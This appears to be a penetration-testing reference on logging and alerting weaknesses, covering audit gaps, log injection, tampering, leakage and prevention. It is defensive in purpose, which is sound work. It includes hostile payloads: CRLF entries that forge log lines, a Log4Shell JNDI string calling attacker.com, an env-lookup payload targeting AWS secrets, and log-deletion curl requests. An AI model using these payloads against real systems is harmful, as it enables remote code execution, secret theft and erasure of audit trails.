# Logging & Alerting Security Reference

**Purpose:** Comprehensive reference for testing logging and alerting security — audit log gaps, log injection, log tampering, alerting thresholds, log data leakage, and SIEM integration gaps.

**OWASP crosswalk:** A09 (Security Logging and Alerting Failures), WSTG not directly mapped (acknowledged gap), ASVS V7.x, CWE-223, CWE-532, CWE-778

**Schema version:** 1
**Skill version:** paladin-probe@v3

---

## Table of Contents

1. [Attack Surface](#1-attack-surface)
2. [Audit Log Gaps](#2-audit-log-gaps)
3. [Log Injection](#3-log-injection)
4. [Log Tampering](#4-log-tampering)
5. [Alerting Thresholds](#5-alerting-thresholds)
6. [Log Data Leakage](#6-log-data-leakage)
7. [Log Transport Security](#7-log-transport-security)
8. [Prevention](#8-prevention)
9. [Real-World CVEs](#9-real-world-cves)
10. [Tooling](#10-tooling)
11. [Testing Methodology](#11-testing-methodology)
12. [Payload Quick Reference](#12-payload-quick-reference)
13. [YAML Fingerprint Tables](#13-yaml-fingerprint-tables)

---

## 1. Attack Surface

### Where Logging Vectors Hide

| Surface | Vector | Risk |
|---------|--------|------|
| Auth events | Login failures not logged | Blind brute-force |
| Privilege changes | Role assignment not audited | Insider abuse untracked |
| Data exports | CSV/download not logged | Data exfiltration |
| Deletion | Hard delete without archive | Data loss untracked |
| Log viewer | Log injection (CRLF) | Log poisoning, SIEM evasion |
| Log files | Plaintext sensitive data | Credential leak |
| Log transport | HTTP without TLS | Log tampering in transit |
| Log storage | World-readable files | Log tampering at rest |
| Alerting | No SIEM integration | Delayed incident response |

### Logging Surface Probe

```bash
# Check if auth failures are logged
curl -s -X POST -d 'user=attacker&pass=wrong' https://target/login
# Check log file (if readable)
cat /var/log/app/auth.log 2>/dev/null

# Check for log viewer endpoints
curl -s https://target/admin/logs
curl -s https://target/api/logs

# Check for exposed log files
curl -s https://target.com/logs/app.log
curl -s https://target.com/error.log
```

---

## 2. Audit Log Gaps

### Events That MUST Be Logged

| Event | Why | Risk If Missing |
|-------|-----|-----------------|
| Login success | Track access | Who accessed the system? |
| Login failure | Detect brute-force | Brute-force invisible |
| Privilege change | Insider threat | Unauthorized escalation |
| Data export | Data exfiltration | No evidence of leak |
| Account creation | Provisioning abuse | Ghost accounts invisible |
| Account deletion/disable | Offboarding | Zombie accounts |
| API key creation | Credential management | Unauthorized key issuance |
| Configuration change | Malicious config | Backdoor config |
| Sensitive data view | PII access | Privacy violation |
| Admin action | All admin actions | No admin audit trail |

### Gap Detection

```bash
# Check if non-repudiation events are in logs
grep -i "login\|logout\|privilege\|role\|export\|delete\|create" /var/log/app.log

# Check what IS being logged
head -100 /var/log/app.log 2>/dev/null
```

### Partial Audit

Worse than no audit — gives false sense of security:
- Logs auth success but NOT auth failure
- Logs API calls but NOT request body size/params
- Logs errors but NOT who triggered them
- Logs reads but NOT writes (or vice versa)

### Detection Signals

- No logs for auth events
- No logs for admin actions
- Logs only for errors (not all security events)
- Audit log configuration not visible

---

## 3. Log Injection

### CRLF Injection in Logs

```http
POST /api/login HTTP/1.1
Content-Type: application/json

{"username": "attacker\r\n[2026-07-28 12:00:00] INFO: Login successful for admin"}
```

If the username is logged without sanitization, the injected newline creates a fake log entry. This can:
- Poison SIEM parsing
- Frame legitimate users
- Hide attacker activity

### Log4Shell-style (JNDI Injection)

If the logging framework resolves `${...}` expressions:
```
${jndi:ldap://attacker.com/a}
${env:AWS_SECRET_KEY}
```

### Size-Based Injection

```
POST /api/comment with 100MB payload
# Logs store full request body -> disk exhaustion -> log loss
```

### Encoding Bypass

```
# Log shows UTF-8 but logging framework writes raw bytes
# Attacker injects control characters that break log parsers
\u0000\u0001\u0002
```

### Detection Signals

- Log viewer renders user input without escaping
- Newlines in log files from user input
- `${...}` expressions in log files
- Corrupted log parsing after attacker input

---

## 4. Log Tampering

### Mutable Logs

```bash
# Check log file permissions
ls -la /var/log/app.log
# If world-writable -> attacker can delete/modify entries

# Check if logs are append-only
# chattr +a -> append only (safe)
# No chattr -> mutable (vulnerable)
```

### In-Application Log Deletion

```bash
POST /api/admin/logs/clear
# If 200 -> anyone with access can clear audit trail

POST /api/admin/logs/delete
{"from": "2026-07-01", "to": "2026-07-28"}
# Range deletion -> selective cover-up
```

### Log Rotation Abuse

```
1. Attacker generates 10GB of logs (dummy requests)
2. Log rotation deletes old logs to make space
3. Audit trail for attacker's real activity is rotated out
```

### Centralized Log Bypass

If logs are written locally before shipping:
```
1. Attacker disables log shipper (systemd service, cron)
2. Locally generated logs pile up but never reach SIEM
3. After compromise, attacker deletes local logs
4. SIEM has no record of the incident
```

### Detection Signals

- Log files are world-writable
- Log deletion/clear API exists
- Application has no append-only mechanism
- Centralized log shipping without buffer protection
- Rotation deletes old logs without archiving

---

## 5. Alerting Thresholds

### Missing Alert on Brute Force

```
Condition: 100 failed logins in 1 minute from same IP
Expected: Alert triggered, account locked or rate-limited
Reality: No alert, no action -> brute-force invisible
```

### Missing Alert on Privilege Escalation

```
Condition: User role changed from "viewer" to "admin"
Expected: Alert to security team
Reality: No alert (only audit log entry)
```

### Missing Alert on Bulk Export

```
Condition: User exported 10,000+ records in 1 minute
Expected: Alert for data exfiltration
Reality: No alert
```

### Alert Fatigue (Too Many Alerts)

```
Condition: Every login failure alerts
Reality: 10,000 login failures/hour -> security team ignores
Missing: Rate-based alerting (X failures in Y time)
```

### Detection Signals

- No alerting mechanism found in application
- Alerting only for errors (5xx), not security events
- Alerts have no thresholds (every event fires)
- No SIEM/webhook integration

---

## 6. Log Data Leakage

### Sensitive Data in Logs

| Data Type | Risk |
|-----------|------|
| Password (plaintext) | Credential theft |
| Session token | Session hijacking |
| API key | Account takeover |
| Credit card number | PCI violation |
| PII (CPF, email, phone) | Privacy violation |
| Request body (full) | All of the above |
| SQL query | Query structure disclosure |

### Leak Detection

```bash
# Check log files for sensitive data
grep -i "password\|secret\|token\|authorization" /var/log/app.log
# Check if full request bodies are logged
grep -i "POST\|PUT\|PATCH" /var/log/app.log
```

### Contextual Log Exposure

```
GET /health/ready -> logs DSN string, DB host, API endpoint
// Error log includes full stack trace with env vars
```

### Log Aggregator Exposure

If logs are shipped to a centralized platform (Splunk, ELK, Datadog, etc.):
- Check who has access to the aggregator
- Check if aggregator URLs are public
- Check if log viewer is exposed without auth

### Detection Signals

- Passwords, tokens, or API keys in log files
- Full request bodies logged for sensitive endpoints
- Log viewer accessible without authentication
- Centralized logging platform exposed

---

## 7. Log Transport Security

### Unencrypted Transport

```
Application -> syslog (UDP/plaintext) -> Logstash
# Logs sent over unencrypted UDP -> anyone on network reads them
```

### Shared Log Storage

```
S3 bucket: logs-company-public
# Public bucket -> anyone reads logs
```

### No TLS to SIEM

```bash
# Check if log shipper uses TLS
grep -i "ssl\|tls\|ca_cert\|verify_mode" /etc/logstash/conf.d/*
# If no TLS -> logs sent in plaintext
```

### Authentication to SIEM

- Log shipper has no credentials → anyone can send logs to SIEM (log injection)
- Log shipper credentials are hardcoded in config
- Log shipper uses HTTP basic auth (leaked in process list)

### Detection Signals

- Log shipping over UDP without TLS
- No authentication for log shipper
- Public S3 bucket for logs
- Hardcoded log shipper credentials

---

## 8. Prevention

### Audit Logging

- Log all auth events (login success/failure, logout, password reset)
- Log all privilege changes (role assignment, admin action)
- Log all data exports (bulk download, CSV export)
- Log all account changes (create, delete, disable, enable)
- Log all configuration changes
- Include: timestamp, user, action, resource, result, source IP
- Exclude: passwords, secrets, full request bodies on sensitive endpoints

### Log Injection Prevention

- Sanitize user-controlled data before logging: strip newlines, control characters
- Reject or truncate log entries exceeding size limits
- Disable JNDI lookups in log framework (Log4j 2.17.0+)
- Use structured logging (JSON) not raw text concatenation
- Never eval `${}` in log messages

### Log Tampering Prevention

- Append-only log files (`chattr +a`, immutable storage)
- Centralized log shipping from write-once buffer
- Log file integrity monitoring (Wazuh, Auditd)
- No in-application log deletion API
- Log rotation preserves archives (doesn't delete)

### Alerting

- Alert on: X failed logins in Y minutes, role escalation, bulk data export, configuration change, new admin account
- Rate-based thresholds to reduce alert fatigue
- SIEM webhook or email integration
- Escalation path for critical alerts (non-receipt alert)

### Log Security

- Never log secrets, passwords, tokens, or full request body
- Mask/PII data before logging (CPF: xxx.xxx.xxx-00)
- Use structured logging (JSON fields, not string concatenation)
- Transport logs over TLS (TLS 1.2+)
- Authenticate log shippers (API key or client cert)
- Restrict log access to security team only

---

## 9. Real-World CVEs

| CVE | Year | Product | Impact |
|-----|------|---------|--------|
| CVE-2024-53041 | 2024 | Logstash | Log injection via unvalidated input |
| CVE-2024-45760 | 2024 | Splunk Enterprise | Stored XSS via log injection |
| CVE-2024-29982 | 2024 | Microsoft OLE | Log injection leading to credential leak |
| CVE-2024-23897 | 2024 | Jenkins | Arbitrary file read via log viewer |
| CVE-2024-22263 | 2024 | Spring Cloud | Log injection via service name |
| CVE-2023-44487 | 2023 | HTTP/2 — log flooding | Log amplification DoS |
| CVE-2021-44228 | 2021 | Log4Shell | JNDI injection via log message |

---

## 10. Tooling

| Tool | Purpose |
|------|---------|
| SIEM check | Manual review of SIEM rules |
| Wazuh | Log monitoring, integrity monitoring |
| Auditd | Linux audit framework |
| ELK stack | Log analysis (also attack target) |
| Log4j scanner | Log4Shell vulnerability scanner |
| Lynis | System audit including logging |

---

## 11. Testing Methodology

### Phase 1: Audit Gap Analysis

1. List all security-relevant events in the application
2. Check which are logged (log file or SIEM check)
3. Identify missing events
4. Check log entry completeness (timestamp, user, action, result, IP)

### Phase 2: Log Injection

1. Send payloads with newlines (`\r\n`) in username, search query
2. Send payloads with control characters
3. Send payloads with `${jndi:...}` or `${env:...}`
4. Check log viewer/corrupted log output

### Phase 3: Log Tampering

1. Check log file permissions
2. Check for log deletion APIs
3. Check for log rotation behavior
4. Check centralized shipping continuity

### Phase 4: Log Data Leakage

1. Search log files for secrets (grep patterns)
2. Check what is logged for various endpoints (read, write, auth)
3. Check if log aggregator is exposed
4. Check if log viewer is unauthenticated

### Phase 5: Alerting

1. Check what alerting mechanisms exist (SIEM, webhook, email)
2. Check thresholds and tuning
3. Check if alerts are actionable (non-generic)
4. Check alert escalation path

---

## 12. Payload Quick Reference

```bash
# Log injection with newline
curl -X POST -d 'username=attacker%0d%0a[INFO] Login successful for admin&pass=test' https://target/login

# Log injection with JNDI (Log4j)
curl -X POST -d 'username=${jndi:ldap://attacker.com/a}&pass=test' https://target/login

# Log injection with control characters
curl -X POST -d 'username=\u0000\u0001\u0002&pass=test' https://target/login

# Check log exposure
curl -s https://target.com/logs/app.log
curl -s https://target.com/error.log
curl -s https://target.com/admin/logs

# Audit gap checks
grep -i "password\|secret\|token" /var/log/app.log
grep -c "login" /var/log/app.log

# Log deletion API
curl -X DELETE https://target/admin/logs
curl -X DELETE https://target/admin/logs -d '{"from":"2026-01-01","to":"2026-07-28"}'

# Log file permissions
ls -la /var/log/app.log

# SIEM transport check
grep -i "ssl\|tls\|verify" /etc/logstash/conf.d/*
```

---

## 13. YAML Fingerprint Tables

```yaml
audit_log_gap_auth:
  probe: 'trigger login failure and check if event is logged'
  detection: no auth failure event in log

audit_log_gap_privilege:
  probe: 'change user role and check if event is logged'
  detection: no privilege change event in log

log_injection_crlf:
  probe: "send username with %0d%0a in login request"
  detection: newline or fake log entry in log viewer

log_injection_jndi:
  probe: "send ${jndi:ldap://attacker.com/a} in request"
  detection: JNDI lookup attempted (Log4Shell)

log_tamper_deletion:
  probe: 'check for in-app log deletion endpoint'
  detection: log deletion or clear API exists

log_tamper_permissions:
  probe: 'ls -la /var/log/app.log'
  detection: log file world-writable

log_leak_secrets:
  probe: 'grep log files for password patterns'
  detection: passwords, tokens, or secrets in log

log_leak_request_body:
  probe: 'check log content for POST body data'
  detection: full request body logged for sensitive endpoint

alerting_missing:
  probe: 'review SIEM rules or webhook config'
  detection: no alert for auth failure, privilege change, or bulk export

log_transport_insecure:
  probe: 'check log shipper config for TLS'
  detection: log transport without TLS or authentication
```
